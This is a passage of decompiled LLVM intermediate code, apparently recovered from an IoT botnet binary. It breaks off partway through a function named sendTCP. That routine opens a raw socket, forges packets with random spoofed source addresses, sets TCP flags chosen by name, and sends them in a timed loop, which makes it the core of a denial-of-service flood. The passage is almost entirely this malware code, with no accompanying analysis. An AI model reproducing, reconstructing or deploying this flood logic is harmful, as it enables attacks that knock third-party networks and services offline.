dec_label_pc_cdec:                                ; preds = %dec_label_pc_c8d8, %dec_label_pc_c778, %dec_label_pc_c800, %dec_label_pc_c7e8, %dec_label_pc_cde8
  %v12_cdf0 = phi i32 [ %v3_c788, %dec_label_pc_c778 ], [ 0, %dec_label_pc_c800 ], [ %v3_c7f8, %dec_label_pc_c7e8 ], [ %v12_cdf033, %dec_label_pc_cde8 ], [ %v2_c8dc, %dec_label_pc_c8d8 ]
  store i32 %v3_c6fc, i32* @r4, align 4
  store i32 %v6_c6fc, i32* @fp, align 4
  ret i32 %v12_cdf0

; uselistorder directives
  uselistorder i32 %v1_cddc, { 1, 0 }
  uselistorder i32 %v1_cd90, { 2, 1, 0 }
  uselistorder i32 %v1_cd44, { 1, 0 }
  uselistorder i32 %v3_ccf4, { 1, 0 }
  uselistorder i32 %v0_ccdc, { 1, 0 }
  uselistorder i32 %v3_ccd4, { 1, 0 }
  uselistorder i8 %v0_cc90.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cc90, { 1, 0 }
  uselistorder i32 %v0_cc64, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_cdc0, { 1, 0 }
  uselistorder i32 %v2_cc20, { 1, 0 }
  uselistorder i32 %v3_cc08, { 1, 0 }
  uselistorder i32 %v1_cbfc, { 1, 0 }
  uselistorder i32 %v1_cbe0, { 0, 2, 1 }
  uselistorder i32 %v3_ccb0.pre-phi, { 1, 0 }
  uselistorder i8 %v0_cb64.sink.off0, { 1, 0 }
  uselistorder i32 %v3_cb84, { 2, 1, 0 }
  uselistorder i32 %v0_cb64, { 1, 0 }
  uselistorder i32 %v0_cb38, { 1, 0 }
  uselistorder i32 %v3_cb30, { 1, 0 }
  uselistorder i32 %v1_cb24, { 1, 0 }
  uselistorder i32 %v3_cb18, { 1, 0 }
  uselistorder i32 %v3_caa4, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_ca74, { 1, 0 }
  uselistorder i32 %v1_ca2c, { 1, 0 }
  uselistorder i32 %v1_c900, { 1, 0 }
  uselistorder i32 %v3_c878, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_c930, { 1, 0 }
  uselistorder i32 %v2_c85c, { 1, 0 }
  uselistorder i32 %v1_c80c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_c798, { 1, 0, 2 }
  uselistorder i32 %v3_c75c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_cdec, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ccc4, { 1, 0 }
  uselistorder label %dec_label_pc_cc3c, { 1, 0 }
  uselistorder label %dec_label_pc_cb98, { 1, 0 }
  uselistorder label %dec_label_pc_ca70, { 1, 0 }
  uselistorder label %dec_label_pc_c9f4, { 1, 0 }
  uselistorder label %dec_label_pc_c8d8, { 1, 0 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c778, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ce04 = load i32, i32* @r4, align 4
  %v6_ce04 = load i32, i32* @fp, align 4
  store i32 52748, i32* %stack_var_-4, align 4
  %v2_ce08 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ce08, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ce44 = icmp eq i32 %arg2, 0
  br i1 %v2_ce44, label %dec_label_pc_ce4c, label %dec_label_pc_ce6c

dec_label_pc_ce4c:                                ; preds = %entry
  %v0_ce4c = call i32 @rand_cmwc()
  %v3_ce54 = mul i32 %v0_ce4c, 65536
  store i32 %v3_ce54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ce90

dec_label_pc_ce6c:                                ; preds = %entry
  %v3_ce74 = urem i32 %arg2, 65536
  store i32 %v3_ce74, i32* %r3.global-to-local, align 4
  %v1_ce7c = call i32 @htons(i32 %v3_ce74)
  br label %dec_label_pc_ce90

dec_label_pc_ce90:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_ce6c
  %v2_ce94 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_ce94, i32* %r3.global-to-local, align 4
  %v3_cea0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_cea0, i32* %r3.global-to-local, align 4
  %v2_cea8 = icmp eq i32 %v3_cea0, 0
  br i1 %v2_cea8, label %dec_label_pc_ceb4, label %dec_label_pc_d48c

dec_label_pc_ceb4:                                ; preds = %dec_label_pc_ce90
  %v2_ceb4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_ced8 = call i32 @socket()
  store i32 %v0_ced8, i32* %r3.global-to-local, align 4
  %v2_cee8 = icmp eq i32 %v0_ced8, 0
  br i1 %v2_cee8, label %dec_label_pc_cef0, label %dec_label_pc_cf08

dec_label_pc_cef0:                                ; preds = %dec_label_pc_ceb4
  %v2_cef4 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_cef4, i32* %r3.global-to-local, align 4
  %v3_cf00 = call i32 @Rootsprintf(i32 %v2_cef4, i32 ptrtoint ([27 x i8]* @global_var_196dc.467 to i32))
  br label %dec_label_pc_d48c

dec_label_pc_cf08:                                ; preds = %dec_label_pc_ceb4
  store i32 1, i32* %stack_var_-68, align 4
  %v2_cf10 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_cf10, i32* %r3.global-to-local, align 4
  %v6_cf2c = call i32 @__GI_setsockopt(i32 %v0_ced8, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_cf2c, i32* %r3.global-to-local, align 4
  %v1_cf34 = icmp slt i32 %v6_cf2c, 0
  br i1 %v1_cf34, label %dec_label_pc_cf3c, label %dec_label_pc_cf54

dec_label_pc_cf3c:                                ; preds = %dec_label_pc_cf08
  %v2_cf40 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_cf40, i32* %r3.global-to-local, align 4
  %v3_cf4c = call i32 @Rootsprintf(i32 %v2_cf40, i32 ptrtoint ([33 x i8]* @global_var_196f8.469 to i32))
  br label %dec_label_pc_d48c

dec_label_pc_cf54:                                ; preds = %dec_label_pc_cf08
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_cf58 = icmp eq i32 %arg4, 0
  br i1 %v2_cf58, label %dec_label_pc_cf84, label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf54
  %v1_cf70 = sub i32 32, %arg4
  store i32 %v1_cf70, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cf7c = shl i32 -1, %v1_cf70
  br label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf54, %dec_label_pc_cf6c
  %storemerge10 = phi i32 [ %v1_cf7c, %dec_label_pc_cf6c ], [ 0, %dec_label_pc_cf54 ]
  %v1_cf88 = add i32 %arg6, 40
  %v1_cf98 = add i32 %arg6, 46
  %v3_cf9c = and i32 %v1_cf98, -4
  %v1_cfa4 = load i32, i32* @sp, align 4
  %v2_cfa4 = sub i32 %v1_cfa4, %v3_cf9c
  %v1_cfb4 = add i32 %v2_cfa4, 11
  %v3_cfb8 = and i32 %v1_cfb4, -4
  store i32 %v3_cfb8, i32* %r2.global-to-local, align 4
  %v1_cfd8 = add i32 %v3_cfb8, 20
  store i32 %v1_cfd8, i32* %r3.global-to-local, align 4
  %v5_cfdc = inttoptr i32 %v1_cfd8 to i8*
  %v3_cfe0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_cfe0, i32* @r4, align 4
  %v1_cfe8 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_cfe8, i32* %r3.global-to-local, align 4
  %v1_cff4 = call i32 @htonl(i32 %v1_cfe8)
  store i32 %v1_cff4, i32* %r2.global-to-local, align 4
  %v1_d000 = add i32 %arg6, 20
  %v1_d004 = load i32, i32* @sp, align 4
  %v2_d004 = inttoptr i32 %v1_d004 to i32*
  store i32 %v1_d000, i32* %v2_d004, align 4
  %v0_d00c = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_d014 = inttoptr i32 %v3_cfb8 to i8*
  %v5_d014 = call i32 @makeIPPacket(i8* %v4_d014, i32 %v0_d00c, i32 %v1_cff4, i32 6)
  %v0_d018 = call i32 @rand_cmwc()
  %v3_d024 = urem i32 %v0_d018, 65536
  store i32 %v3_d024, i32* %r3.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d02c = trunc i32 %v0_d018 to i8
  store i8 %v1_d02c, i8* %v5_cfdc, align 4
  %v0_d030 = load i32, i32* %r3.global-to-local, align 4
  %v3_d030 = sdiv i32 %v0_d030, 256
  store i32 %v3_d030, i32* %r3.global-to-local, align 4
  %v1_d034 = trunc i32 %v3_d030 to i8
  %v2_d034 = load i32, i32* %r2.global-to-local, align 4
  %v3_d034 = add i32 %v2_d034, 1
  %v4_d034 = inttoptr i32 %v3_d034 to i8*
  store i8 %v1_d034, i8* %v4_d034, align 1
  %v0_d038 = call i32 @rand_cmwc()
  %v2_d044 = add i32 %v3_cfb8, 24
  %v3_d044 = inttoptr i32 %v2_d044 to i32*
  store i32 %v0_d038, i32* %v3_d044, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d050 = add i32 %v3_cfb8, 28
  %v3_d050 = inttoptr i32 %v2_d050 to i32*
  store i32 0, i32* %v3_d050, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d058 = add i32 %v3_cfb8, 32
  %v2_d058 = inttoptr i32 %v1_d058 to i8*
  %v3_d058 = load i8, i8* %v2_d058, align 4
  %v1_d064 = urem i8 %v3_d058, 16
  %v1_d068 = or i8 %v1_d064, 80
  store i8 %v1_d068, i8* %v2_d058, align 4
  %v3_d078 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d078, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1971c.474 to i32), i32* @r1, align 4
  %v3_d084 = inttoptr i32 %v3_d078 to i8*
  %v4_d084 = call i32 @__GI_strcoll(i8* %v3_d084, i32 ptrtoint ([4 x i8]* @global_var_1971c.474 to i32))
  store i32 %v4_d084, i32* %r3.global-to-local, align 4
  %v2_d08c = icmp eq i32 %v4_d084, 0
  br i1 %v2_d08c, label %dec_label_pc_d094, label %dec_label_pc_d0e8

dec_label_pc_d094:                                ; preds = %dec_label_pc_cf84
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d098 = add i32 %v3_cfb8, 33
  %v2_d098 = inttoptr i32 %v1_d098 to i8*
  %v3_d098 = load i8, i8* %v2_d098, align 1
  %v4_d098 = zext i8 %v3_d098 to i32
  %v1_d09c = or i32 %v4_d098, 2
  store i32 %v1_d09c, i32* %r3.global-to-local, align 4
  %v1_d0a0 = trunc i32 %v1_d09c to i8
  store i8 %v1_d0a0, i8* %v2_d098, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d0a8 = load i8, i8* %v2_d098, align 1
  %v4_d0a8 = zext i8 %v3_d0a8 to i32
  %v1_d0ac = or i32 %v4_d0a8, 4
  store i32 %v1_d0ac, i32* %r3.global-to-local, align 4
  %v1_d0b0 = trunc i32 %v1_d0ac to i8
  store i8 %v1_d0b0, i8* %v2_d098, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d0b8 = load i8, i8* %v2_d098, align 1
  %v4_d0b8 = zext i8 %v3_d0b8 to i32
  %v1_d0bc = or i32 %v4_d0b8, 1
  store i32 %v1_d0bc, i32* %r3.global-to-local, align 4
  %v1_d0c0 = trunc i32 %v1_d0bc to i8
  store i8 %v1_d0c0, i8* %v2_d098, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d0c8 = load i8, i8* %v2_d098, align 1
  %v4_d0c8 = zext i8 %v3_d0c8 to i32
  %v1_d0cc = or i32 %v4_d0c8, 16
  store i32 %v1_d0cc, i32* %r3.global-to-local, align 4
  %v1_d0d0 = trunc i32 %v1_d0cc to i8
  store i8 %v1_d0d0, i8* %v2_d098, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d0d8 = load i8, i8* %v2_d098, align 1
  %v4_d0d8 = zext i8 %v3_d0d8 to i32
  %v1_d0dc = or i32 %v4_d0d8, 8
  store i32 %v1_d0dc, i32* %r3.global-to-local, align 4
  %v1_d0e0 = trunc i32 %v1_d0dc to i8
  store i8 %v1_d0e0, i8* %v2_d098, align 1
  br label %dec_label_pc_d22c

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_cf84
  %v3_d0e8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d0e8, i32* %r3.global-to-local, align 4
  store i32 %v3_d0e8, i32* @r0, align 4
  %v2_d0f4 = call i32 @__GI_strtok(i32 %v3_d0e8, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  store i32 %v2_d0f4, i32* %r3.global-to-local, align 4
  %v2_d22420 = icmp eq i32 %v2_d0f4, 0
  br i1 %v2_d22420, label %dec_label_pc_d22c, label %dec_label_pc_d104.lr.ph

dec_label_pc_d104.lr.ph:                          ; preds = %dec_label_pc_d0e8
  %v1_d124 = add i32 %v3_cfb8, 33
  %v2_d124 = inttoptr i32 %v1_d124 to i8*
  br label %dec_label_pc_d104

dec_label_pc_d104:                                ; preds = %dec_label_pc_d104.lr.ph, %dec_label_pc_d20c
  %storemerge1421 = phi i32 [ %v2_d0f4, %dec_label_pc_d104.lr.ph ], [ %v2_d214, %dec_label_pc_d20c ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19724.478 to i32), i32* @r1, align 4
  %v3_d110 = inttoptr i32 %storemerge1421 to i8*
  %v4_d110 = call i32 @__GI_strcoll(i8* %v3_d110, i32 ptrtoint ([4 x i8]* @global_var_19724.478 to i32))
  store i32 %v4_d110, i32* %r3.global-to-local, align 4
  %v2_d118 = icmp eq i32 %v4_d110, 0
  br i1 %v2_d118, label %dec_label_pc_d120, label %dec_label_pc_d134

dec_label_pc_d120:                                ; preds = %dec_label_pc_d104
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d124 = load i8, i8* %v2_d124, align 1
  %v4_d124 = zext i8 %v3_d124 to i32
  %v1_d128 = or i32 %v4_d124, 2
  store i32 %v1_d128, i32* %r3.global-to-local, align 4
  %v1_d12c = trunc i32 %v1_d128 to i8
  store i8 %v1_d12c, i8* %v2_d124, align 1
  br label %dec_label_pc_d20c

dec_label_pc_d134:                                ; preds = %dec_label_pc_d104
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19728.480 to i32), i32* @r1, align 4
  %v4_d140 = call i32 @__GI_strcoll(i8* %v3_d110, i32 ptrtoint ([4 x i8]* @global_var_19728.480 to i32))
  store i32 %v4_d140, i32* %r3.global-to-local, align 4
  %v2_d148 = icmp eq i32 %v4_d140, 0
  br i1 %v2_d148, label %dec_label_pc_d150, label %dec_label_pc_d164

dec_label_pc_d150:                                ; preds = %dec_label_pc_d134
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d154 = load i8, i8* %v2_d124, align 1
  %v4_d154 = zext i8 %v3_d154 to i32
  %v1_d158 = or i32 %v4_d154, 4
  store i32 %v1_d158, i32* %r3.global-to-local, align 4
  %v1_d15c = trunc i32 %v1_d158 to i8
  store i8 %v1_d15c, i8* %v2_d124, align 1
  br label %dec_label_pc_d20c

dec_label_pc_d164:                                ; preds = %dec_label_pc_d134
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1972c.482 to i32), i32* @r1, align 4
  %v4_d170 = call i32 @__GI_strcoll(i8* %v3_d110, i32 ptrtoint ([4 x i8]* @global_var_1972c.482 to i32))
  store i32 %v4_d170, i32* %r3.global-to-local, align 4
  %v2_d178 = icmp eq i32 %v4_d170, 0
  br i1 %v2_d178, label %dec_label_pc_d180, label %dec_label_pc_d194

dec_label_pc_d180:                                ; preds = %dec_label_pc_d164
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d184 = load i8, i8* %v2_d124, align 1
  %v4_d184 = zext i8 %v3_d184 to i32
  %v1_d188 = or i32 %v4_d184, 1
  store i32 %v1_d188, i32* %r3.global-to-local, align 4
  %v1_d18c = trunc i32 %v1_d188 to i8
  store i8 %v1_d18c, i8* %v2_d124, align 1
  br label %dec_label_pc_d20c

dec_label_pc_d194:                                ; preds = %dec_label_pc_d164
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19730.484 to i32), i32* @r1, align 4
  %v4_d1a0 = call i32 @__GI_strcoll(i8* %v3_d110, i32 ptrtoint ([4 x i8]* @global_var_19730.484 to i32))
  store i32 %v4_d1a0, i32* %r3.global-to-local, align 4
  %v2_d1a8 = icmp eq i32 %v4_d1a0, 0
  br i1 %v2_d1a8, label %dec_label_pc_d1b0, label %dec_label_pc_d1c4

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d194
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d1b4 = load i8, i8* %v2_d124, align 1
  %v4_d1b4 = zext i8 %v3_d1b4 to i32
  %v1_d1b8 = or i32 %v4_d1b4, 16
  store i32 %v1_d1b8, i32* %r3.global-to-local, align 4
  %v1_d1bc = trunc i32 %v1_d1b8 to i8
  store i8 %v1_d1bc, i8* %v2_d124, align 1
  br label %dec_label_pc_d20c

dec_label_pc_d1c4:                                ; preds = %dec_label_pc_d194
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19734.486 to i32), i32* @r1, align 4
  %v4_d1d0 = call i32 @__GI_strcoll(i8* %v3_d110, i32 ptrtoint ([4 x i8]* @global_var_19734.486 to i32))
  store i32 %v4_d1d0, i32* %r3.global-to-local, align 4
  %v2_d1d8 = icmp eq i32 %v4_d1d0, 0
  br i1 %v2_d1d8, label %dec_label_pc_d1e0, label %dec_label_pc_d1f4

dec_label_pc_d1e0:                                ; preds = %dec_label_pc_d1c4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v3_d1e4 = load i8, i8* %v2_d124, align 1
  %v4_d1e4 = zext i8 %v3_d1e4 to i32
  %v1_d1e8 = or i32 %v4_d1e4, 8
  store i32 %v1_d1e8, i32* %r3.global-to-local, align 4
  %v1_d1ec = trunc i32 %v1_d1e8 to i8
  store i8 %v1_d1ec, i8* %v2_d124, align 1
  br label %dec_label_pc_d20c

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1c4
  %v2_d1f8 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_d1f8, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_d208 = call i32 @Rootsprintf(i32 %v2_d1f8, i32 ptrtoint ([18 x i8]* @global_var_19738.488 to i32))
  br label %dec_label_pc_d20c

dec_label_pc_d20c:                                ; preds = %dec_label_pc_d1e0, %dec_label_pc_d1b0, %dec_label_pc_d180, %dec_label_pc_d150, %dec_label_pc_d120, %dec_label_pc_d1f4
  store i32 0, i32* @r0, align 4
  %v2_d214 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  store i32 %v2_d214, i32* %r3.global-to-local, align 4
  %v2_d224 = icmp eq i32 %v2_d214, 0
  br i1 %v2_d224, label %dec_label_pc_d22c, label %dec_label_pc_d104

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d20c, %dec_label_pc_d0e8, %dec_label_pc_d094
  %v0_d22c = call i32 @rand_cmwc()
  %v3_d238 = urem i32 %v0_d22c, 65536
  store i32 %v3_d238, i32* %r3.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d240 = trunc i32 %v0_d22c to i8
  %v3_d240 = add i32 %v3_cfb8, 34
  %v4_d240 = inttoptr i32 %v3_d240 to i8*
  store i8 %v1_d240, i8* %v4_d240, align 2
  %v0_d244 = load i32, i32* %r3.global-to-local, align 4
  %v3_d24425 = udiv i32 %v0_d244, 256
  %v1_d248 = trunc i32 %v3_d24425 to i8
  %v2_d248 = load i32, i32* %r2.global-to-local, align 4
  %v3_d248 = add i32 %v2_d248, 15
  %v4_d248 = inttoptr i32 %v3_d248 to i8*
  store i8 %v1_d248, i8* %v4_d248, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d254 = add i32 %v3_cfb8, 36
  %v4_d254 = inttoptr i32 %v3_d254 to i8*
  store i8 0, i8* %v4_d254, align 4
  %v0_d258 = load i32, i32* %r3.global-to-local, align 4
  %v1_d258 = trunc i32 %v0_d258 to i8
  %v2_d258 = load i32, i32* %r2.global-to-local, align 4
  %v3_d258 = add i32 %v2_d258, 17
  %v4_d258 = inttoptr i32 %v3_d258 to i8*
  store i8 %v1_d258, i8* %v4_d258, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d264 = add i32 %v3_cfb8, 38
  %v4_d264 = inttoptr i32 %v3_d264 to i8*
  store i8 0, i8* %v4_d264, align 2
  %v0_d268 = load i32, i32* %r3.global-to-local, align 4
  %v1_d268 = trunc i32 %v0_d268 to i8
  %v2_d268 = load i32, i32* %r2.global-to-local, align 4
  %v3_d268 = add i32 %v2_d268, 19
  %v4_d268 = inttoptr i32 %v3_d268 to i8*
  store i8 %v1_d268, i8* %v4_d268, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ce44, label %dec_label_pc_d278, label %dec_label_pc_d290

dec_label_pc_d278:                                ; preds = %dec_label_pc_d22c
  %v0_d278 = call i32 @rand_cmwc()
  %v3_d280 = mul i32 %v0_d278, 65536
  store i32 %v3_d280, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d278 to i8
  br label %dec_label_pc_d2ac

dec_label_pc_d290:                                ; preds = %dec_label_pc_d22c
  %v3_d298 = urem i32 %arg2, 65536
  store i32 %v3_d298, i32* %r3.global-to-local, align 4
  %v1_d2a0 = call i32 @htons(i32 %v3_d298)
  %extract.t71 = trunc i32 %v1_d2a0 to i8
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d290
  %v0_d278.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d278 ], [ %extract.t71, %dec_label_pc_d290 ]
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v4_d2b0 = sext i8 %v0_d278.sink.off0 to i32
  %v3_d2b4 = add i32 %v3_cfb8, 22
  %v4_d2b4 = inttoptr i32 %v3_d2b4 to i8*
  store i8 %v0_d278.sink.off0, i8* %v4_d2b4, align 2
  %v3_d2bc = sdiv i32 %v4_d2b0, 256
  %v4_d2bc = trunc i32 %v3_d2bc to i8
  store i32 %v3_d2bc, i32* %r3.global-to-local, align 4
  %v4_d2c0 = add i32 %v3_cfb8, 23
  %v5_d2c0 = inttoptr i32 %v4_d2c0 to i8*
  store i8 %v4_d2bc, i8* %v5_d2c0, align 1
  %v5_d2cc = call i32 @tcpcsum(i32 %v3_cfb8, i32 %v1_cfd8, i32 %v1_cfd8, i32 %v3_d2bc)
  %sext = mul i32 %v5_d2cc, 16777216
  %v1_d2d0 = sdiv i32 %sext, 16777216
  store i32 %v1_d2d0, i32* %r3.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d2d8 = trunc i32 %v1_d2d0 to i8
  store i8 %v1_d2d8, i8* %v4_d254, align 4
  %v0_d2dc = load i32, i32* %r3.global-to-local, align 4
  %v3_d2dc28 = udiv i32 %v0_d2dc, 256
  %v1_d2e0 = trunc i32 %v3_d2dc28 to i8
  %v2_d2e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2e0 = add i32 %v2_d2e0, 17
  %v4_d2e0 = inttoptr i32 %v3_d2e0 to i8*
  store i8 %v1_d2e0, i8* %v4_d2e0, align 1
  %v1_d2f0 = or i32 %v3_cfb8, 2
  store i32 %v1_d2f0, i32* %r3.global-to-local, align 4
  %v1_d2f4 = inttoptr i32 %v1_d2f0 to i8*
  %v2_d2f4 = load i8, i8* %v1_d2f4, align 2
  %v3_d2f4 = zext i8 %v2_d2f4 to i32
  store i32 %v3_d2f4, i32* %r2.global-to-local, align 4
  %v1_d2f8 = or i32 %v1_cfb4, 3
  %v2_d2f8 = inttoptr i32 %v1_d2f8 to i8*
  %v3_d2f8 = load i8, i8* %v2_d2f8, align 1
  %v4_d2f8 = zext i8 %v3_d2f8 to i32
  %v4_d2fc = mul nuw nsw i32 %v4_d2f8, 256
  %v5_d2fc = or i32 %v4_d2fc, %v3_d2f4
  store i32 %v5_d2fc, i32* %r3.global-to-local, align 4
  %v3_d308 = call i32 @csum(i8* %v4_d014, i32 %v5_d2fc)
  %sext4 = mul i32 %v3_d308, 16777216
  %v1_d30c = sdiv i32 %sext4, 16777216
  store i32 %v1_d30c, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb8, i32* %r2.global-to-local, align 4
  %v1_d314 = trunc i32 %v1_d30c to i8
  %v3_d314 = add i32 %v3_cfb8, 10
  %v4_d314 = inttoptr i32 %v3_d314 to i8*
  store i8 %v1_d314, i8* %v4_d314, align 2
  %v0_d318 = load i32, i32* %r3.global-to-local, align 4
  %v3_d318 = sdiv i32 %v0_d318, 256
  store i32 %v3_d318, i32* %r3.global-to-local, align 4
  %v1_d31c = trunc i32 %v3_d318 to i8
  %v2_d31c = load i32, i32* %r2.global-to-local, align 4
  %v3_d31c = add i32 %v2_d31c, 11
  %v4_d31c = inttoptr i32 %v3_d31c to i8*
  store i8 %v1_d31c, i8* %v4_d31c, align 1
  %v2_d324 = call i32 @__GI_time(i32* null)
  %v2_d330 = add i32 %v2_d324, %arg3
  store i32 %v2_d330, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d388 = add i32 %v3_cfb8, 12
  %v3_d388 = inttoptr i32 %v2_d388 to i32*
  %v3_d3a0 = add i32 %v3_cfb8, 4
  %v4_d3a0 = inttoptr i32 %v3_d3a0 to i8*
  %v4_d3e8 = add i32 %v3_cfb8, 37
  %v5_d3e8 = inttoptr i32 %v4_d3e8 to i8*
  br label %dec_label_pc_d344

dec_label_pc_d344:                                ; preds = %dec_label_pc_d47c, %dec_label_pc_d470, %dec_label_pc_d2ac
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_d2ac ], [ 0, %dec_label_pc_d470 ], [ %v1_d480, %dec_label_pc_d47c ]
  store i32 %v3_cfb8, i32* %r2.global-to-local, align 4
  %v1_d34c = load i32, i32* @sp, align 4
  %v2_d34c = inttoptr i32 %v1_d34c to i32*
  store i32 %v2_ceb4, i32* %v2_d34c, align 4
  %v1_d354 = load i32, i32* @sp, align 4
  %v2_d354 = add i32 %v1_d354, 4
  %v3_d354 = inttoptr i32 %v2_d354 to i32*
  store i32 16, i32* %v3_d354, align 4
